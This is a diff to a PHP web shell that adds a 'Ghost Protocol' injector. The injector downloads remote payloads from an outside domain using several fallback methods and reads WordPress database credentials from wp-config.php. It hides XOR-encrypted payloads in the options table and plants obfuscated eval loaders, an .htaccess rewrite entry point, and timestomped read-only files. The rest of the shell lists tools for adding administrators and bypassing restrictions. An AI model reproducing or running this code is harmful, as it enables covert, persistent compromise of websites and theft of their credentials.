@@ -469,6 +469,130 @@ if (isset($_SERVER[$h_act])) {
     if ($action === 'tool') {
         $tool = isset($_SERVER[$h_tool]) ? $_SERVER[$h_tool] : '';
         $home_dirs = get_home_dirs();
+        
+        // --- GHOST PROTOCOL INJECTOR (PORTED FROM INSTALLER) ---
+        if ($tool === 'ghost_injector') {
+            
+            // 1. Helper Functions khusus Injector (dibuat lokal/unik nama)
+            function _inst_rnd($len = 6) { return substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $len); }
+            function _inst_xor($d, $k) { $out = ''; $len = strlen($d); $key_len = strlen($k); for($i = 0; $i < $len; $i++) { $out .= $d[$i] ^ $k[$i % $key_len]; } return $out; }
+            function _inst_junk() { $j=""; for($i=0;$i<50;$i++){ $v=_inst_rnd(rand(5,10)); $val=md5(rand()); $j.=" public \$$v = '$val';\n"; } return $j; }
+            function _inst_dl($u) {
+                $ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36';
+                $tmp=sys_get_temp_dir().'/sess_'.md5(uniqid());
+                if(function_exists('curl_init')){ $c=curl_init($u); curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1, CURLOPT_FOLLOWLOCATION=>1, CURLOPT_SSL_VERIFYPEER=>0, CURLOPT_USERAGENT=>$ua, CURLOPT_TIMEOUT=>30, CURLOPT_CONNECTTIMEOUT=>15, CURLOPT_IPRESOLVE=>CURL_IPRESOLVE_V4]); $d=@curl_exec($c); curl_close($c); if($d && strlen($d) > 5) return $d; }
+                if(ini_get('allow_url_fopen')){ $ctx = stream_context_create(['http'=>['method'=>'GET','header'=>"User-Agent: $ua\r\n",'timeout'=>30]]); $d=@file_get_contents($u,false,$ctx); if($d && strlen($d) > 5) return $d; }
+                if(ini_get('allow_url_fopen')){ if(@copy($u,$tmp)){ $d=@file_get_contents($tmp); @unlink($tmp); if($d && strlen($d) > 5) return $d; } }
+                $cmds = ["wget -qO- --no-check-certificate --timeout=30 --user-agent='$ua' " . escapeshellarg($u), "curl -sL -k --connect-timeout 15 --max-time 30 --user-agent '$ua' " . escapeshellarg($u), "lynx -source " . escapeshellarg($u)];
+                foreach($cmds as $c){ if(function_exists('shell_exec')) { $d=@shell_exec($c); if(strlen($d)>10) return $d; } }
+                $p = parse_url($u); $host=$p['host']; $path=isset($p['path'])?$p['path']:'/'; $port=($p['scheme']=='https')?443:80; $ssl=($p['scheme']=='https')?'ssl://':'';
+                $fp = @fsockopen($ssl.$host, $port, $err, $errs, 15);
+                if($fp){ fwrite($fp, "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: $ua\r\nConnection: Close\r\n\r\n"); $body=''; $head=true; while(!feof($fp)){ $l=fgets($fp,4096); if($head && ($l=="\r\n"||$l=="\n")){$head=false;continue;} if(!$head)$body.=$l; } fclose($fp); if(strlen($body)>10) return $body; }
+                return false;
+            }
+            function _inst_dl_retry($u) { $d=_inst_dl($u); if($d)return $d; return _inst_dl(str_replace('https','http',$u)); }
+            
+            // 2. Logic Injection
+            echo "<div style='font-family:monospace; font-size:12px; background:#000; padding:10px;'>";
+            echo "<div class='text-warning fw-bold mb-2'>--- GHOST PROTOCOL DEPLOYMENT ---</div>";
+
+            $targets = [
+                ['https://stepmomhub.com/seoo.txt',  'error_log.php', 'transient_sys_pma_check'],
+                ['https://stepmomhub.com/vx.txt',    'vx.php',        'transient_sys_cache_vx'],
+                ['https://stepmomhub.com/index.txt', 'index.php',     'transient_sys_idx_core']
+            ];
+
+            // Cek WP di current path ($target)
+            $wp_creds = false;
+            $wp_conf_path = false;
+            if (file_exists($target . '/wp-config.php')) $wp_conf_path = $target . '/wp-config.php';
+            elseif (file_exists(dirname($target) . '/wp-config.php')) $wp_conf_path = dirname($target) . '/wp-config.php';
+
+            if ($wp_conf_path) {
+                $c = @file_get_contents($wp_conf_path);
+                if ($c) {
+                    function _iv($k,$s){ if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i',$s,$m))return $m[1]; return ''; }
+                    $wp_creds=[]; $wp_creds['n']=_iv('DB_NAME',$c); $wp_creds['u']=_iv('DB_USER',$c); $wp_creds['p']=_iv('DB_PASSWORD',$c); $wp_creds['h']=_iv('DB_HOST',$c);
+                    $wp_creds['x']='wp_'; if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$c,$m)) $wp_creds['x']=$m[1];
+                }
+            }
+            
+            $is_wp = ($wp_creds && !empty($wp_creds['n']));
+            if($is_wp) echo "<div class='text-success mb-1'>[+] Target System: WordPress (DB Injection Mode)</div>";
+            else echo "<div class='text-warning mb-1'>[!] Target System: Generic (File Storage Mode)</div>";
+
+            foreach ($targets as $t) {
+                $url=$t[0]; $fname=$t[1]; $dbkey=$t[2];
+                if (!$is_wp && $fname !== 'error_log.php') continue;
+
+                echo "<div class='text-info'>Downloading $fname...</div>";
+                $raw = _inst_dl_retry($url);
+                if(!$raw || strlen($raw) < 10) { echo "<div class='text-danger'>[-] Failed Download: $fname</div>"; continue; }
+                
+                $xor_key = _inst_rnd(8);
+                $enc = bin2hex(_inst_xor(gzdeflate($raw, 9), $xor_key));
+                $junk_props = _inst_junk();
+                $cls_name = 'WP_Sys_'.ucfirst(str_replace('.php','',$fname)).'_' . _inst_rnd(3);
+                $save_path = $target . '/' . $fname;
+                
+                if (file_exists($save_path)) { @chmod($save_path, 0644); if(!is_writable($save_path)) @unlink($save_path); }
+
+                $ok = false;
+                
+                if ($is_wp) {
+                    $m = new mysqli($wp_creds['h'], $wp_creds['u'], $wp_creds['p'], $wp_creds['n']);
+                    if(!$m->connect_error) {
+                        $tbl = $wp_creds['x'] . 'options';
+                        $m->query("DELETE FROM $tbl WHERE option_name='$dbkey'");
+                        $stmt = $m->prepare("INSERT INTO $tbl (option_name, option_value, autoload) VALUES (?, ?, 'no')");
+                        $stmt->bind_param("ss", $dbkey, $enc);
+                        
+                        if($stmt->execute()) {
+                            $loader = "<?php\nerror_reporting(0);\nif(!class_exists('$cls_name')){class $cls_name{\n$junk_props private \$k='$xor_key';\npublic function run(\$h,\$u,\$p,\$n,\$x,\$kdb){\$c=new mysqli(\$h,\$u,\$p,\$n);if(\$c->connect_error)return false;\$t=\$x.'options';\$q=\"SELECT option_value FROM {\$t} WHERE option_name='{\$kdb}' LIMIT 1\";\$r=\$c->query(\$q);if(\$r && \$row=\$r->fetch_assoc()){return \$this->dec(\$row['option_value']);}return false;}\nprivate function dec(\$h){\$b=@hex2bin(\$h);\$o='';\$l=strlen(\$b);\$kl=strlen(\$this->k);for(\$i=0;\$i<\$l;\$i++)\$o.=\$b[\$i]^\$this->k[\$i%\$kl];return @gzinflate(\$o);}}}\n\$app=new $cls_name();\$code=\$app->run('{$wp_creds['h']}','{$wp_creds['u']}','{$wp_creds['p']}','{$wp_creds['n']}','{$wp_creds['x']}','$dbkey');if(\$code)eval('?>'.\$code);?>";
+                            if(file_put_contents($save_path, $loader)) {
+                                $ok = true; 
+                                echo "<div class='text-success'>[+] Injected to DB & Loader created: $fname</div>";
+                                if($fname == 'index.php') {
+                                    // Inject .htaccess
+                                    $htaccess = $target . '/.htaccess';
+                                    $rule = "\n# SITEMAP INDEX\n<Files \"sxallsitemap.xml\">\nOrder allow,deny\nAllow from all\n</Files>\nRewriteEngine On\nRewriteRule ^sxallsitemap\.xml$ index.php [L]\n";
+                                    $hc = ""; if(file_exists($htaccess)) $hc = @file_get_contents($htaccess);
+                                    if(strpos($hc, 'sxallsitemap.xml') === false) { @file_put_contents($htaccess, $rule . $hc); echo "<div class='text-info'>[.htaccess] XML Map Applied</div>"; }
+                                }
+                            } else { echo "<div class='text-danger'>[-] Write Error: $save_path</div>"; }
+                        } else { echo "<div class='text-danger'>[-] DB Insert Failed</div>"; }
+                        $m->close();
+                    } else { echo "<div class='text-danger'>[-] DB Connect Failed</div>"; }
+                } else {
+                    // Non-WP
+                    $store = $target . '/.sys_' . substr(md5(rand()), 0, 8) . '.inc';
+                    if(file_put_contents($store, $enc)) {
+                        $loader = "<?php\nerror_reporting(0);\nif(!class_exists('$cls_name')){class $cls_name{\n$junk_props private \$p;private \$k='$xor_key';\npublic function __construct(\$f){\$this->p=__DIR__.'/'.\$f;}\npublic function load(){if(!file_exists(\$this->p))return false;\$h=@file_get_contents(\$this->p);if(\$h){\$b=@hex2bin(\$h);\$o='';\$l=strlen(\$b);\$kl=strlen(\$this->k);for(\$i=0;\$i<\$l;\$i++)\$o.=\$b[\$i]^\$this->k[\$i%\$kl];return @gzinflate(\$o);}return false;}}}\n\$app=new $cls_name('".basename($store)."');\$code=\$app->load();if(\$code)eval('?>'.\$code);?>";
+                        if(file_put_contents($save_path, $loader)) {
+                            $ok = true;
+                            echo "<div class='text-success'>[+] File Stored & Loader created: $fname</div>";
+                        }
+                    }
+                }
+                
+                // Timestomp
+                $ref = file_exists($target.'/index.php') ? $target.'/index.php' : __FILE__;
+                if(file_exists($save_path)) { @touch($save_path, filemtime($ref)); @chmod($save_path, 0444); }
+
+                if($ok) {
+                    $final_url = $fname;
+                    if ($fname == 'index.php' && $is_wp) $final_url = 'sxallsitemap.xml';
+                    echo "<div><a href='$final_url' target='_blank' class='text-warning fw-bold'>[ OPEN ".strtoupper($fname)." ]</a></div>";
+                }
+                echo "<hr style='border-color:#333; margin:5px 0;'>";
+            }
+            
+            // Auto remove setup if needed (optional)
+            if(file_exists($target.'/setup.php')) { @unlink($target.'/setup.php'); echo "<div class='text-secondary'>Info: setup.php removed</div>"; }
+            
+            echo "</div>";
+            exit;
+        }
 
         // --- UPDATED MASS UPLOAD (USE ROBUST WRITE) ---
         if ($tool === 'mass_upload') {
@@ -1158,7 +1282,7 @@ if (isset($_SERVER[$h_act])) {
             x_write(".htaccess", base64_decode($ht_b64));
             
             echo "<div class='text-success'>[+] GOD MODE Bypass Active (Base64 Encoded Content)!</div>";
-            echo "Akses Root: <a href='$dir/root/' target='_blank'>[ ROOT / ]</a><br>";
+            echo "Akses Root: <a href='$dir/root/' target='_blank' class='text-warning fw-bold'>[ ROOT / ]</a><br>";
             echo "Akses User: <a href='$dir/' target='_blank'>[ BYPASS FOLDER ($n Users) ]</a><br>";
             echo "<small style='color:#777'>Keamanan: Perintah Shell & .htaccess disamarkan dengan Base64.</small>";
             exit;
@@ -1495,8 +1619,9 @@ if (isset($_SERVER[$h_act])) {
 
                     <div class="tool-cmd" onclick="openScanSite()"><div class="cmd-left"><i class="fas fa-satellite-dish cmd-icon c-cyan"></i><span class="cmd-text">SCAN SITE</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                 
-                    <div class="tool-cmd" onclick="openAddAdminUI()"><div class="cmd-left"><i class="fas fa-user-shield cmd-icon c-lime"></i><span class="cmd-text">AUTO ADD ADMIN GUI</span></div><i class="fas fa-arrow-right cmd-arrow"></i>
-                   </div>
+                    <div class="tool-cmd" onclick="openAddAdminUI()"><div class="cmd-left"><i class="fas fa-user-shield cmd-icon c-lime"></i><span class="cmd-text">AUTO ADD ADMIN GUI</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
+
+                    <div class="tool-cmd" onclick="runTool('ghost_injector')"><div class="cmd-left"><i class="fas fa-ghost cmd-icon text-white"></i><span class="cmd-text">GHOST PROTOCOL (Injector)</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                 </div>
             </div>
         </div>
